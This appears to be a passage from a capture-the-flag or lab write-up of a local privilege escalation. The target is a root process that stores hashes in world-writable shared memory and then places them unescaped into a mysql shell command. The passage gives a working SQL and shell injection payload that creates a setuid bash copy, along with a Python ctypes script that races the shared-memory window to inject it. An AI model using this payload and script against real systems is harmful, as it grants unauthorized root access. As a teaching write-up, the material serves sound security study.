Stripped of ASan noise, the logic boils down to this:

Looks up the user's hash, checks it against the leaked list, and if it's leaked, stashes it in shared memory for a second before `notify_user` reads it back out and clears it.

Checked `write_to_shm` and `notify_user` next. Two bugs stack together:
- `write_to_shm` creates the segment with permissions `0666`, world readable and writable, anyone on the box can touch it.
- `notify_user` reads the hash back by grabbing everything after `>` in the stored string, then drops it straight into a shell command unescaped: `mysql -u %s -D %s -e 'select email from teampass_users where pw = "%s"'`.

So during that 1-second window, if I overwrite the shared memory with my own payload instead of the real hash, I control part of a root shell command.

Payload breaks out of the SQL string and uses `mysql`'s `\!` shell-escape:
```
" or 1=1; \! /bin/sh -c "cp /bin/bash /home/reader/.bash && chmod 4755 /home/reader/.bash"; #
```

Small Python script using `ctypes` to call `shmget`/`shmat` straight from libc, catching the random shm key from the live output and injecting the payload before `notify_user` reads it:
```
import sys, re, ctypes

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.shmat.restype = ctypes.c_void_p
payload = sys.argv[1].encode()

for line in sys.stdin:
    print(line, end="")
    if m := re.search(r"shared memory (0x[0-9a-fA-F]+)", line):
        key = int(m.group(1), 16)
        shmid = libc.shmget(key, 0, 0)
        addr = libc.shmat(shmid, None, 0)
        current = ctypes.string_at(addr, 256).split(b"\x00")[0]
        ctypes.memmove(addr, current + payload, len(current) + len(payload))
        break
```
